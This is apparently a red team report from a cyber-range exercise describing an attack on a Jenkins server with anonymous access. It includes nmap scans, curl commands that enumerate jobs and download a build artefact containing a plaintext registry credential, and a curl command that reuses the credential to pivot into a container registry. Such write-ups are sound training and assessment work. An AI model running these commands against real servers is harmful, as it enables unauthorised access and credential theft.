# Red Team Engagement Report
## M1 — dev-jenkins | Jenkins Anonymous Read + Artifact Exposure
**Classification:** RESTRICTED — White Team / Judges Only
**Report ID:** RED-REPORT-DEV01-M01
**Operator:** Rudra-7 (KAAL CHAKRA CI/CD Specialist)
**Range:** RNG-DEV-01 · VIKAS TANTRA · OPERATION GRIDFALL

---

## 1. Executive Summary

| Item | Value |
|---|---|
| Target | Jenkins CI/CD Server |
| Target IP | `11.x.x.x:8080` |
| Vulnerability | Jenkins `useSecurity=false` + credential in archived artefact |
| MITRE | T1190 · T1552.001 |
| Severity | High |
| Outcome | **SUCCESSFUL** — Registry credential `pul-registry-svc:Rg5try@PUL!Bld24` extracted |
| Pivot To | M2 Container Registry (`11.x.x.x:5000`) |

---

## 2. Reconnaissance

**Entry Point:** SSH to `dev-jump.prabalurja.in` (`11.x.x.x`) using key from RNG-IT-02 M5 Ansible AWX job output.

**Subnet Discovery:**
```bash
nmap -sn 11.x.x.x/24 --open
nmap -sV -p 8080,5000,9000,9200,8888 <discovered hosts>
```

Jenkins 2.x identified on port 8080. Browser navigation confirms no login prompt — dashboard loads immediately.

---

## 3. Exploitation

### 3.1 — Unauthenticated API Enumeration
```bash
curl -s "http://11.x.x.x:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[relativePath]]]"
```

Response (relevant extract):
```json
{
  "jobs": [
    {
      "name": "pul-firmware-build",
      "lastBuild": {
        "result": "SUCCESS",
        "artifacts": [
          {"relativePath": "deploy-bundle/docker-config.json"},
          {"relativePath": "deploy-bundle/build-manifest.txt"}
        ]
      }
    }
  ]
}
```

### 3.2 — Artefact Download
```bash
curl -s "http://11.x.x.x:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" \
     -o /tmp/docker-config.json
cat /tmp/docker-config.json
```

Credential confirmed: `pul-registry-svc : Rg5try@PUL!Bld24`

---

## 4. Attack Timeline

| Step | Time | Action | Outcome |
|---|---|---|---|
| 1 | T+00:00 | Subnet scan from jump host | Jenkins on 8080 confirmed |
| 2 | T+00:02 | `GET /api/json` (anonymous) | Full job listing returned |
| 3 | T+00:03 | Identify `pul-firmware-build` job + artefact path | Target artefact found |
| 4 | T+00:04 | Download `docker-config.json` | Credential extracted |
| 5 | T+00:05 | Base64 decode `auth` field | Credential verified |
| 6 | T+00:06 | Pivot to M2 Container Registry | Success |

---

## 5. Artefacts Collected

| Artefact | Description |
|---|---|
| `/tmp/docker-config.json` | Docker registry auth config with `pul-registry-svc:Rg5try@PUL!Bld24` |
| Build manifest | Internal registry endpoint `11.x.x.x:5000` confirmed |
| Arun Sharma note | TODO comment referencing Vault migration (DEVOPS-2847) |

---

## 6. Operator Notes (Rudra-7)

The Jenkins instance matches the pattern documented in KAAL CHAKRA's DARKLINE campaign artefacts — Jenkins deployments where the security wizard was skipped during rapid infrastructure deployment and never re-enabled. The `docker-config.json` credential in the artefact is a textbook "last mile" credential storage anti-pattern. The Vault integration ticket (DEVOPS-2847) has apparently been open for months — consistent with PUL's pattern of deferring security work under delivery pressure.

---

## 7. Pivot Setup

```bash
# Test registry access with extracted credential
curl -s -u pul-registry-svc:Rg5try@PUL!Bld24 \
     http://11.x.x.x:5000/v2/_catalog
# Expected: {"repositories":["pul/firmware-builder","pul/sonar-runner"]}
```

---

*RED-REPORT-DEV01-M01 | RNG-DEV-01 VIKAS TANTRA | OPERATION GRIDFALL*
*For White Team / Judge Validation Only*
